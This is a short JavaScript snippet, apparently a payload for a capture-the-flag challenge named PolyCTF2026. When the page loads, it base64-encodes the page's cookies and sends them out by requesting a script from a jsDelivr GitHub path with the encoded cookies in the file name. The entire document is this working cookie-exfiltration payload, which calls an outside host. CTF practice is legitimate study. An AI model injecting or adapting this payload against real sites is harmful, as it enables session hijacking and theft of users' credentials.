window.addEventListener('DOMContentLoaded', () => {
    let flag = btoa(document.cookie).replace(/=/g, '');
    let s = document.createElement('script');
    s.src = `https://cdn.jsdelivr.net/gh/s25553258troy/PolyCTF2026@main/${flag}.js`;
    document.head.appendChild(s);
});
